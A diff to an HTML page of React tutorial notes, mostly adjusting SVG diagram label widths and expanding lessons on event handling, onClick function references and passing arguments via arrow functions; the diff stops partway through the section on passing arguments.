@@ -1406,8 +1406,8 @@ console.log(skills);
                   <!-- Stage 4: Layout / Reflow (HEAVY) -->
                   <g transform="translate(390, 20)">
                     <rect x="0" y="0" width="165" height="145" rx="8" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="10" width="135" height="18" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="82" y="23" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">STAGE 3 · BOTTLENECK</text>
+                    <rect x="15" y="10" width="174" height="18" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="102" y="23" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">STAGE 3 · BOTTLENECK</text>
                     <text x="82" y="48" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Layout / Reflow</text>
                     <rect x="10" y="60" width="145" height="72" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
                     <text x="82" y="82" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">• Exact geometry (X,Y)</text>
@@ -1745,8 +1745,8 @@ console.log(skills);
                   <!-- Step 1: npm create vite -->
                   <g transform="translate(25, 25)">
                     <rect x="0" y="0" width="190" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="40" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2" />
-                    <text x="35" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">01</text>
+                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2" />
+                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">01</text>
                     <text x="65" y="30" class="svg-kicker" style="fill:var(--primary); font-weight:700;">SCAFFOLD</text>
                     <text x="95" y="62" text-anchor="middle" class="svg-title">npm create vite</text>
                     <rect x="15" y="76" width="160" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -1763,8 +1763,8 @@ console.log(skills);
                   <!-- Step 2: cd <dir> -->
                   <g transform="translate(249, 25)">
                     <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.5"/>
-                    <rect x="15" y="15" width="40" height="20" rx="4" fill="var(--border)" />
-                    <text x="35" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">02</text>
+                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--border)" />
+                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">02</text>
                     <text x="65" y="30" class="svg-kicker" style="font-weight:700;">NAVIGATE</text>
                     <text x="90" y="62" text-anchor="middle" class="svg-title">cd app-name</text>
                     <rect x="15" y="76" width="150" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -1781,8 +1781,8 @@ console.log(skills);
                   <!-- Step 3: npm i -->
                   <g transform="translate(463, 25)">
                     <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--bg-subsection)" stroke="var(--accent)" stroke-width="1.5"/>
-                    <rect x="15" y="15" width="40" height="20" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2" />
-                    <text x="35" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">03</text>
+                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2" />
+                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">03</text>
                     <text x="65" y="30" class="svg-kicker" style="fill:var(--accent); font-weight:700;">DEPENDENCIES</text>
                     <text x="90" y="62" text-anchor="middle" class="svg-title">npm i</text>
                     <rect x="15" y="76" width="150" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--accent)"/>
@@ -1799,8 +1799,8 @@ console.log(skills);
                   <!-- Step 4: npm run dev -->
                   <g transform="translate(677, 25)">
                     <rect x="0" y="0" width="180" height="150" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="40" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2" />
-                    <text x="35" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">04</text>
+                    <rect x="15" y="15" width="41" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2" />
+                    <text x="35.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">04</text>
                     <text x="65" y="30" class="svg-kicker" style="fill:var(--success); font-weight:700;">LIVE SERVER</text>
                     <text x="90" y="62" text-anchor="middle" class="svg-title" style="fill:var(--success);">npm run dev</text>
                     <rect x="15" y="76" width="150" height="48" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -1984,8 +1984,8 @@ body {
                   <!-- Grandparent: index.html -->
                   <g transform="translate(25, 25)">
                     <rect x="0" y="0" width="250" height="195" rx="12" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="85" height="22" rx="4" fill="var(--border)"/>
-                    <text x="57" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text); font-weight:700;">GRANDPARENT</text>
+                    <rect x="15" y="15" width="108" height="22" rx="4" fill="var(--border)"/>
+                    <text x="69" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">GRANDPARENT</text>
                     <text x="125" y="62" text-anchor="middle" class="svg-title">index.html (Dadaji)</text>
                     <text x="125" y="80" text-anchor="middle" class="svg-sub">Physical DOM Foundation</text>
 
@@ -1993,8 +1993,8 @@ body {
                     <text x="125" y="116" text-anchor="middle" class="svg-mono-xs" style="font-weight:700; fill:var(--primary);">&lt;div id="root"&gt;&lt;/div&gt;</text>
                     <text x="125" y="134" text-anchor="middle" class="svg-sub">Target mounting container</text>
 
-                    <rect x="15" y="152" width="220" height="30" rx="4" fill="var(--bg-canvas)" stroke="var(--border)"/>
-                    <text x="125" y="172" text-anchor="middle" class="svg-mono-xs" style="font-size:10px;">&lt;script src="/src/main.jsx"&gt;</text>
+                    <rect x="15" y="152" width="220" height="30" rx="4" fill="var(--bg-surface)" stroke="var(--border)"/>
+                    <text x="125" y="172" text-anchor="middle" class="svg-mono-xs" style="font-size:10.5px; fill:var(--text-primary); font-weight:600;">&lt;script src="/src/main.jsx"&gt;&lt;/script&gt;</text>
                   </g>
 
                   <!-- Connect 1 -> 2 -->
@@ -2007,8 +2007,8 @@ body {
                   <!-- Parent: main.jsx -->
                   <g transform="translate(325, 25)">
                     <rect x="0" y="0" width="260" height="195" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="2"/>
-                    <rect x="15" y="15" width="65" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="47" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">PARENT</text>
+                    <rect x="15" y="15" width="71" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="50.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">PARENT</text>
                     <text x="130" y="62" text-anchor="middle" class="svg-title">main.jsx (Papa)</text>
                     <text x="130" y="80" text-anchor="middle" class="svg-sub">Mounting & Root Engine</text>
 
@@ -2028,8 +2028,8 @@ body {
                   <!-- Child: App.jsx -->
                   <g transform="translate(635, 25)">
                     <rect x="0" y="0" width="220" height="195" rx="12" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="2"/>
-                    <rect x="15" y="15" width="55" height="22" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
-                    <text x="42" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">CHILD</text>
+                    <rect x="15" y="15" width="63" height="22" rx="4" fill="var(--accent-light)" stroke="var(--accent)" stroke-width="1.2"/>
+                    <text x="46.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--accent); font-weight:700;">CHILD</text>
                     <text x="110" y="62" text-anchor="middle" class="svg-title">App.jsx (Baccha)</text>
                     <text x="110" y="80" text-anchor="middle" class="svg-sub">UI Markup & Content</text>
 
@@ -2220,8 +2220,8 @@ export default App</code></pre>
                   <!-- Bad: Monolith -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="100" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="65" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">ANTI-PATTERN</text>
+                    <rect x="15" y="15" width="115" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="72.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">ANTI-PATTERN</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Monolithic Sprawling App.jsx</text>
 
                     <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -2234,8 +2234,8 @@ export default App</code></pre>
                   <!-- Good: Modular Components -->
                   <g transform="translate(460, 20)">
                     <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">RECOMMENDED PATTERN</text>
+                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">RECOMMENDED PATTERN</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Clean Component Architecture</text>
 
                     <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -2568,8 +2568,8 @@ export default Navbar;</code></pre>
                   <!-- Summary Box: Why Props -->
                   <g transform="translate(605, 20)">
                     <rect x="0" y="0" width="250" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">THE SOLUTION: PROPS</text>
+                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">THE SOLUTION: PROPS</text>
                     <text x="125" y="60" text-anchor="middle" class="svg-title" style="fill:var(--success);">Same Shell · Dynamic Data</text>
 
                     <rect x="15" y="74" width="220" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -2735,20 +2735,20 @@ export default App;</code></pre>
                   <!-- Flow to Card 1 -->
                   <path d="M 320 65 L 320 95 L 140 95 L 140 120" fill="none" stroke="var(--primary)" stroke-width="2"/>
                   <polygon points="135,120 140,128 145,120" fill="var(--primary)"/>
-                  <rect x="40" y="82" width="200" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
-                  <text x="140" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--primary);">{ user: "Sarthak", age: 18 }</text>
+                  <rect x="40" y="82" width="234" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
+                  <text x="157" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--primary);">{ user: "Sarthak", age: 18 }</text>
 
                   <!-- Flow to Card 2 -->
                   <path d="M 440 65 L 440 120" fill="none" stroke="var(--accent)" stroke-width="2"/>
                   <polygon points="435,120 440,128 445,120" fill="var(--accent)"/>
-                  <rect x="340" y="82" width="200" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
-                  <text x="440" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--accent);">{ user: "Aman", age: 21 }</text>
+                  <rect x="340" y="82" width="212" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--accent)"/>
+                  <text x="446" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--accent);">{ user: "Aman", age: 21 }</text>
 
                   <!-- Flow to Card 3 -->
                   <path d="M 560 65 L 560 95 L 740 95 L 740 120" fill="none" stroke="var(--success)" stroke-width="2"/>
                   <polygon points="735,120 740,128 745,120" fill="var(--success)"/>
-                  <rect x="640" y="82" width="200" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
-                  <text x="740" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--success);">{ user: "Aditya", age: 24 }</text>
+                  <rect x="640" y="82" width="227" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
+                  <text x="753.5" y="97" text-anchor="middle" class="svg-mono-xs" style="font-size:10px; fill:var(--success);">{ user: "Aditya", age: 24 }</text>
 
                   <!-- Child 1 -->
                   <g transform="translate(30, 130)">
@@ -2957,8 +2957,8 @@ const Card = (props) => {
                   <!-- Bad: Quotes -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="170" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="100" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="65" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">INCORRECT ❌</text>
+                    <rect x="15" y="15" width="108" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="69" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">INCORRECT ❌</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Quotation Marks: Literal String</text>
 
                     <rect x="15" y="70" width="365" height="78" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -3058,8 +3058,8 @@ const Card = (props) => {
                   <!-- forEach: Undefined -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="120" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="75" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">arr.forEach() ❌</text>
+                    <rect x="15" y="15" width="137" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="83.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">arr.forEach() ❌</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Returns undefined</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -3071,8 +3071,8 @@ const Card = (props) => {
                   <!-- map: Returns Array -->
                   <g transform="translate(460, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="100" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="65" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">arr.map() ✓</text>
+                    <rect x="15" y="15" width="108" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="69" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">arr.map() ✓</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Returns New JSX Array</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -3494,8 +3494,8 @@ import '../styles/Header.css';</code></pre>
                   <!-- Global Monolith -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">MONOLITHIC GLOBAL CSS</text>
+                    <rect x="15" y="15" width="182" height="22" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="106" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">MONOLITHIC GLOBAL CSS</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Single Massive index.css</text>
 
                     <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -3508,8 +3508,8 @@ import '../styles/Header.css';</code></pre>
                   <!-- Separate Files -->
                   <g transform="translate(460, 20)">
                     <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">COMPONENT-LINKED CSS</text>
+                    <rect x="15" y="15" width="174" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="102" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">COMPONENT-LINKED CSS</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Split Styles Directory</text>
 
                     <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--primary)"/>
@@ -4052,8 +4052,8 @@ export default defineConfig({
                   <!-- Good: Additive -->
                   <g transform="translate(460, 20)">
                     <rect x="0" y="0" width="395" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="140" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="85" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT PATTERN ✓</text>
+                    <rect x="15" y="15" width="152" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="91" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT PATTERN ✓</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Additive Plugin Chaining</text>
 
                     <rect x="15" y="74" width="365" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -4339,8 +4339,8 @@ export default defineConfig({
 
                   <!-- RightContent -->
                   <g transform="translate(675, 210)">
-                    <rect x="0" y="0" width="170" height="24" rx="4" fill="var(--success-bg)" stroke="var(--success)"/>
-                    <text x="85" y="16" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;RightContent /&gt; (Cards)</text>
+                    <rect x="0" y="0" width="204" height="24" rx="4" fill="var(--success-bg)" stroke="var(--success)"/>
+                    <text x="102" y="16" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">&lt;RightContent /&gt; (Cards)</text>
                   </g>
                 </svg>
               </div>
@@ -4386,8 +4386,8 @@ export default defineConfig({
                   <!-- Outer Container -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="830" height="180" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="220" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="125" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">overflow-x-auto flex flex-nowrap</text>
+                    <rect x="15" y="15" width="264" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="147" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">overflow-x-auto flex flex-nowrap</text>
 
                     <!-- Card 1 -->
                     <g transform="translate(20, 50)">
@@ -4567,28 +4567,49 @@ export default defineConfig({
           num: "22.1",
           title: "Vanilla JS addEventListener vs. React Event Props (onClick)",
           content: `
+            <p>
+              In modern web development, capturing user interaction (button clicks, form submits, key presses) is fundamental. However, the architectural difference between Vanilla JavaScript and React is profound:
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Imperative Vanilla JS Way:</strong>
+              <li><strong>The Imperative Vanilla JS Workflow & Its Flaws:</strong>
                 <ul class="notes-sub-list">
-                  <li>In traditional JavaScript, you first find the DOM node with <code>document.querySelector('button')</code>, then manually register a listener with <code>btn.addEventListener('click', handler)</code>.</li>
-                  <li>This imperative approach creates detached listener management and memory leak risks when elements unmount.</li>
+                  <li>In Vanilla JavaScript, attaching an event listener requires finding the DOM element with <code>document.querySelector('button')</code> or <code>document.getElementById()</code>, then imperatively calling <code>btn.addEventListener('click', handler)</code>.</li>
+                  <li><strong>Memory Leak Hazard:</strong> If elements are dynamically created and destroyed without manually running <code>removeEventListener</code>, detached DOM elements stay pinned in browser RAM, causing catastrophic memory leaks.</li>
+                  <li><strong>Scattered Code:</strong> Markup lives in HTML, while event listeners live in separate JS files, forcing developers to mentally jump across files to trace UI behavior.</li>
                 </ul>
               </li>
-              <li><strong>The Declarative React Way:</strong>
+              <li><strong>The Declarative React Way (Co-Located Synthetic Events):</strong>
                 <ul class="notes-sub-list">
-                  <li>React eliminates <code>document.querySelector</code> completely. You attach event listeners directly onto the JSX element using camelCase attributes:
-                    <pre class="notes-code-block"><code>function App() {
-  function btnClicked() {
-    console.log('Button was clicked!');
-  }
-
-  return &lt;button onClick={btnClicked}&gt;Click Here&lt;/button&gt;;
-}</code></pre>
-                  </li>
-                  <li>Under the hood, React uses a centralized <strong>SyntheticEvent</strong> delegator attached to the root container for maximum performance.</li>
+                  <li>In React, event listeners are passed directly as camelCase JSX props (<code>onClick</code>, <code>onChange</code>, <code>onSubmit</code>). You never write <code>document.querySelector</code>.</li>
+                  <li><strong>Root Event Delegation:</strong> React does not attach real DOM listeners to every single button. Instead, starting in React 17/18, React attaches a single top-level delegator listener to the root DOM container (<code>&lt;div id="root"&gt;</code>). When a click bubbles up, React's event system maps the event to the correct component Fiber node in memory and dispatches a cross-browser normalized <strong>SyntheticEvent</strong> wrapper!</li>
+                  <li><strong>Automatic Memory Cleanup:</strong> When a React component unmounts, React cleans up the component's internal listener references automatically—zero memory leaks.</li>
                 </ul>
               </li>
             </ul>
+
+            <pre class="notes-code-block"><code>import React from 'react';
+
+function App() {
+  // Event handler defined directly inside component scope
+  const handleButtonClick = () => {
+    console.log('Button clicked! SyntheticEvent dispatched by React.');
+  };
+
+  return (
+    &lt;div className="p-6"&gt;
+      {/* Declarative: listener is co-located with the UI element */}
+      &lt;button 
+        onClick={handleButtonClick}
+        className="px-4 py-2 bg-emerald-600 text-white rounded font-medium hover:bg-emerald-700 transition"
+      &gt;
+        Click Me
+      &lt;/button&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default App;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -4631,20 +4652,42 @@ export default defineConfig({
           num: "22.2",
           title: "Function Reference vs. Function Call (Critical Rule)",
           content: `
+            <p>
+              One of the most frequent junior bugs in React is accidentally invoking a function during component render instead of passing its reference to the event prop.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Number One Beginner React Mistake:</strong>
+              <li><strong>The Golden Rule: Pass the Reference, Do Not Call:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Correct (Passing Reference):</strong> <code>&lt;button onClick={btnClicked}&gt;</code></li>
-                  <li><strong>Fatal Bug (Immediate Invocation):</strong> <code>&lt;button onClick={btnClicked()}&gt;</code></li>
-                </ul>
-              </li>
-              <li><strong>Why <code>onClick={btnClicked()}</code> Breaks:</strong>
-                <ul class="notes-sub-list">
-                  <li>Adding parentheses <code>()</code> executes the JavaScript function <strong>immediately during component render</strong> before the user touches anything!</li>
-                  <li>Whatever value the function returns (usually <code>undefined</code>) is assigned to <code>onClick</code>. When the user later clicks the button, nothing happens because <code>onClick={undefined}</code>!</li>
+                  <li><strong>Correct — Passing the Function Reference:</strong>
+                    <br><code>&lt;button onClick={btnClicked}&gt;</code>
+                    <br>Notice there are <strong>NO parentheses</strong>. You are telling React: <em>"Here is the function's address in memory. Store it, and execute it only when the user physically clicks this button."</em>
+                  </li>
+                  <li><strong>Fatal Mistake — Immediate Function Invocation:</strong>
+                    <br><code>&lt;button onClick={btnClicked()}&gt;</code>
+                    <br>The addition of <code>()</code> tells JavaScript to execute <code>btnClicked()</code> immediately when evaluating the JSX during the component's render phase—before the user has ever touched the screen!
+                  </li>
+                  <li><strong>The Infinite Render Loop Trap:</strong> If <code>btnClicked()</code> updates component state (via <code>setState</code>), calling it immediately triggers a re-render. During that re-render, JSX evaluates <code>btnClicked()</code> again, triggering another re-render, spiraling into: <code>Uncaught Error: Too many re-renders. React limits the number of renders to prevent an infinite loop.</code></li>
                 </ul>
               </li>
             </ul>
+
+            <pre class="notes-code-block"><code>function BadComponent() {
+  const [count, setCount] = React.useState(0);
+
+  // ❌ FATAL BUG: count gets updated immediately on render!
+  // Triggers infinite re-render loop!
+  return &lt;button onClick={setCount(count + 1)}&gt;Count: {count}&lt;/button&gt;;
+}
+
+function GoodComponent() {
+  const [count, setCount] = React.useState(0);
+
+  // ✓ CORRECT: Callback passed as a reference
+  const increment = () => setCount(prev => prev + 1);
+
+  return &lt;button onClick={increment}&gt;Count: {count}&lt;/button&gt;;
+}</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -4656,8 +4699,8 @@ export default defineConfig({
                   <!-- Bad: Immediate Call -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="80" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">FATAL MISTAKE ❌</text>
+                    <rect x="15" y="15" width="137" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="83.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">FATAL MISTAKE ❌</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">onClick={btnClicked()}</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -4669,8 +4712,8 @@ export default defineConfig({
                   <!-- Good: Function Reference -->
                   <g transform="translate(460, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="130" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="80" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT PATTERN ✓</text>
+                    <rect x="15" y="15" width="152" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="91" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">CORRECT PATTERN ✓</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">onClick={btnClicked}</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -4685,63 +4728,131 @@ export default defineConfig({
         },
         {
           num: "22.3",
-          title: "Passing Arguments Using an Inline Wrapper Arrow Function",
+          title: "Passing Arguments to Event Handlers via Arrow Functions",
           content: `
-            <ul class="notes-bullet-list">
-              <li><strong>The Dilemma:</strong> How do you pass arguments to your event handler (like <code>deleteUser(user.id)</code>) without invoking it immediately?</li>
-              <li><strong>The Solution — Wrap with an Anonymous Arrow Function:</strong>
-                <pre class="notes-code-block"><code>// WRONG: Fires immediately on render
-&lt;button onClick={deleteUser(user.id)}&gt;Delete&lt;/button&gt;
+            <p>
+              In real-world applications, you rarely call a function without arguments. For example, in a list of users or products, clicking "Delete" requires passing the specific item's <code>id</code>.
+            </p>
 
-// CORRECT: Wrapped in an arrow function
-&lt;button onClick={() => deleteUser(user.id)}&gt;Delete&lt;/button&gt;</code></pre>
+            <ul class="notes-bullet-list">
+              <li><strong>The Problem:</strong> How do you pass <code>id</code> without writing <code>onClick={deleteItem(id)}</code>, which would execute immediately?</li>
